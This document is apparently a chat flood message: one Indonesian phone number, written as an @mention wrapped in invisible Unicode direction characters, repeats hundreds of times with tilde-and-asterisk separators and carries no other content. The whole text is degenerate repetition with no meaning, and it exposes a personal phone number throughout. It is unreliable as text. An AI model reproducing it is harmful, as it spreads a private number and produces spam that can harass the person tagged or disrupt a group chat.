895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~**~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~**~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* 